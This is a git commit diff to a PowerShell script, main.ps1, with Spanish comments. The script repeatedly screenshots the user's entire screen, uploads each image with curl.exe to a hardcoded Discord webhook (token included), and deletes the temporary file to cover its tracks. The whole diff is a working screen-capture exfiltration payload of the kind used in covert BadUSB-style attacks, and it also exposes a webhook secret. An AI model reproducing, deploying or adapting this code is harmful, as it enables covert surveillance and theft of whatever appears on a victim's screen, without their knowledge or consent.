8070ab21a5754b37ac5f4f54050c9f4297523b85
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-08 23:40:27 -0500

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,27 +1,43 @@
-$hookurl = "$dc"
-$seconds = 30 # Screenshot interval
-$a = 1 # Sceenshot amount
+# Define la URL del webhook
+$webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
 
-# shortened URL Detection
-if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
+# Define el intervalo de tiempo entre capturas de pantalla
+$intervaloCapturas = 30
 
-While ($a -gt 0){
-$Filett = "$env:temp\SC.png"
-Add-Type -AssemblyName System.Windows.Forms
-Add-type -AssemblyName System.Drawing
-$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$Width = $Screen.Width
-$Height = $Screen.Height
-$Left = $Screen.Left
-$Top = $Screen.Top
-$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-Start-Sleep 1
-curl.exe -F "file1=@$filett" $hookurl
-Start-Sleep 1
-Remove-Item -Path $filett
-Start-Sleep $seconds
-$a--
+# Define la cantidad de capturas de pantalla a realizar
+$cantidadCapturas = 1
+
+# Función para realizar capturas de pantalla y enviar al webhook
+function CapturarYEnviar {
+    $FileTemp = "$env:TEMP\SC.png"
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
+    $Bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    $Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)
+    $Graphic.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)
+    $Bitmap.Save($FileTemp, [System.Drawing.Imaging.ImageFormat]::Png)
+
+    # Envía la captura de pantalla al webhook
+    curl.exe -F "file1=@$FileTemp" $webhookUrl
+
+    # Elimina el archivo temporal
+    Remove-Item -Path $FileTemp
 }
+
+# Función para ejecutar el ciclo de captura y envío de manera automática
+function EjecutarCiclo {
+    $counter = 0
+    while ($counter -lt $cantidadCapturas) {
+        CapturarYEnviar
+        Start-Sleep -Seconds $intervaloCapturas
+        $counter++
+    }
+}
+
+# Ejecuta el ciclo de captura y envío de manera automática
+EjecutarCiclo
